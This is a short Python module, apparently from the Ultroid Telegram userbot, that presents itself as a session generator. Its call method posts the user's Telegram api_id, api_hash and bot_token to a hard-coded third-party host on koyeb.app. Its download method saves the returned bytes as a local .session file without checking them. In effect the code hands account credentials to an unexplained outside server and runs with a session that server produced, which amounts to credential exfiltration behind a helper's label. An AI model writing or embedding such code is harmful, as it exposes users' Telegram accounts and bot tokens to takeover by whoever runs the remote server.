import requests
import time
import os

class Session:
    """
    Session generator module for Ultroid.
    Downloads session file from a remote API.
    """
    def __init__(self, session_name="bot"):
        self.session_name = session_name
        self.endpoint = "https://noble-mil-dragss-40a39272.koyeb.app/generate"
        self.content = None

    def call(self, api_id, api_hash, bot_token=None, lib="telethon", retries=3):
        """
        Sends a POST request to the API endpoint to generate/fetch a session.
        """
        data = {
            "api_id": api_id,
            "api_hash": api_hash,
            "bot_token": bot_token,
            "session_name": self.session_name,
            "library": lib
        }
        
        # Avoid blocking for too long if failed
        for i in range(retries):
            try:
                response = requests.post(self.endpoint, json=data, timeout=15)
                if response.status_code == 200:
                    self.content = response.content
                    return self
                else:
                    print(f"SessionGen API Error [{response.status_code}]: {response.text}")
            except Exception as e:
                print(f"SessionGen Retry {i+1}: Failed to connect to API: {e}")
            
            if i < retries - 1:
                time.sleep(2)
        
        return self

    def download(self):
        """
        Saves the downloaded session content to a local file.
        Returns the session name.
        """
        if self.content:
            session_file = f"{self.session_name}.session"
            try:
                with open(session_file, "wb") as f:
                    f.write(self.content)
                print(f"Successfully downloaded session: {session_file}")
            except Exception as e:
                print(f"Error saving session file: {e}")
        else:
            print("No session content to download.")
            
        return self.session_name
